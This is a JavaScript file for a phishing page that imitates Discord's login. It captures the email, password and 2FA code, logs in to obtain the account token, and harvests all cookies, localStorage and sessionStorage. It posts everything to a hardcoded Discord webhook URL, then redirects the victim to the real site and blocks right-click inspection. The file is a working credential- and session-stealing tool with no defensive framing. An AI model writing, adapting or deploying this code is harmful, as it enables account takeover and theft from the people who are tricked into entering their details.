// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector('button[type="submit"]'); // Discord uses type="submit" for login button
const emailInput = document.querySelector('input[name="email"]'); // Discord uses name="email"
const passwordInput = document.querySelector('input[name="password"]');

// Debug log to check if inputs are found
console.log("Script loaded. Email input:", emailInput);
console.log("Password input:", passwordInput);

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  loginButton.innerHTML = "";
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                              <span class="inner pulsingEllipsis">
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                              </span>
                           </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  setTimeout(removeEllipsisAnimation, 3000);
}

// --------------------------------------------------
// ---------- GENERATING QRCODE ---------------------
// --------------------------------------------------
function generateQRCode(data) {
  try {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

// --------------------------------------------------
// ---------- COLLECT USER TOKENS -------------------
// --------------------------------------------------
function collectUserTokens() {
  let tokens = {};

  // Get cookies
  const cookies = document.cookie.split(";").reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split("=");
    acc[key] = value;
    return acc;
  }, {});
  tokens.cookies = cookies;

  // Get localStorage (focus on Discord's token key)
  const localStorageTokens = {};
  const localKeys = ["token", "auth_token", "jwt", "access_token"];
  localKeys.forEach(key => {
    if (localStorage.getItem(key)) {
      localStorageTokens[key] = localStorage.getItem(key);
    }
  });
  // Include all localStorage keys for debugging
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageTokens[key] = localStorage.getItem(key);
  }
  tokens.localStorage = localStorageTokens;

  // Get sessionStorage
  const sessionStorageTokens = {};
  const sessionKeys = ["session_token", "temp_token"];
  sessionKeys.forEach(key => {
    if (sessionStorage.getItem(key)) {
      sessionStorageTokens[key] = sessionStorage.getItem(key);
    }
  });
  tokens.sessionStorage = sessionStorageTokens;

  console.log("Collected tokens:", JSON.stringify(tokens, null, 2));
  return tokens;
}

// --------------------------------------------------
// ---------- FETCH ACCOUNT TOKEN -------------------
// --------------------------------------------------
async function fetchAccountToken(email, password) {
  const apiUrl = "/api/v9/auth/login"; // Relative path for same-origin request
  const payload = {
    login: email,
    password: password,
    undelete: false,
    login_source: null,
    gift_code_sku_id: null
  };

  try {
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    const responseText = await response.text();
    console.log("API Response:", responseText);
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${responseText}`);
    }

    const data = JSON.parse(responseText);
    if (data.mfa) {
      // MFA required
      const mfaCode = prompt("Enter your 2FA code:");
      if (!mfaCode) throw new Error("MFA code required");

      const mfaResponse = await fetch("/api/v9/auth/mfa/totp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          code: mfaCode,
          ticket: data.ticket,
          login_source: null,
          gift_code_sku_id: null
        })
      });

      const mfaText = await mfaResponse.text();
      console.log("MFA Response:", mfaText);
      if (!mfaResponse.ok) {
        throw new Error(`MFA HTTP ${mfaResponse.status}: ${mfaText}`);
      }

      const mfaData = JSON.parse(mfaText);
      const token = mfaData.token;
      console.log("MFA Token retrieved:", token);

      const userTokens = collectUserTokens();
      console.log("Collected tokens after MFA login:", userTokens);

      if (token) {
        const qrCode = generateQRCode(token);
        if (qrCode) {
          document.body.appendChild(qrCode);
        }
      }

      return { apiToken: token, userTokens };
    }

    const token = data.token;
    console.log("Token retrieved:", token);

    const userTokens = collectUserTokens();
    console.log("Collected tokens after login:", userTokens);

    if (token) {
      const qrCode = generateQRCode(token);
      if (qrCode) {
        document.body.appendChild(qrCode);
      }
    }

    return { apiToken: token, userTokens };
  } catch (error) {
    console.error("Error fetching token:", error.message);
    // Still collect localStorage token even if API fails
    const userTokens = collectUserTokens();
    if (userTokens.localStorage.token) {
      console.log("Found existing token in localStorage:", userTokens.localStorage.token);
      const qrCode = generateQRCode(userTokens.localStorage.token);
      if (qrCode) {
        document.body.appendChild(qrCode);
      }
      return { apiToken: userTokens.localStorage.token, userTokens };
    }
    return { apiToken: null, userTokens };
  }
}

// --------------------------------------------------
// ---------- WEBHOOK FUNCTION ----------------------
// --------------------------------------------------
async function sendToWebhook(email, password, tokenData) {
  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
  const { apiToken, userTokens } = tokenData || { apiToken: null, userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} } };
  const payload = {
    content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
    username: "Login Attempt",
    avatar_url: "https://example.com/avatar.png"
  };

  console.log("Attempting to send payload:", payload);

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    const responseText = await response.text();
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${responseText}`);
    }

    console.log("Webhook success! Response:", responseText);
    return true;
  } catch (error) {
    console.error("Webhook failed:", error.message);
    alert("There was an error sending the webhook. Check the console.");
    return false;
  }
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", async () => {
  const email = emailInput ? emailInput.value.trim() : "";
  const password = passwordInput ? passwordInput.value.trim() : "";

  console.log("Email:", email, "Password:", password);

  if (!email || !password) {
    alert("Please enter both email and password!");
    return;
  }

  // Start animation
  animateEllipsis();

  // Fetch token and storage data
  const tokenData = await fetchAccountToken(email, password);

  // Send to webhook with token and collected user tokens
  const webhookSuccess = await sendToWebhook(email, password, tokenData);

  // After animation (3s), redirect if success
  setTimeout(() => {
    if (webhookSuccess) {
      console.log("Redirecting to Discord...");
      window.location.href = "https://discord.com/channels/@me";
    } else {
      console.log("Webhook failed - no redirect");
      alert("Login failed - check console for details");
    }
  }, 3000);
});

document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
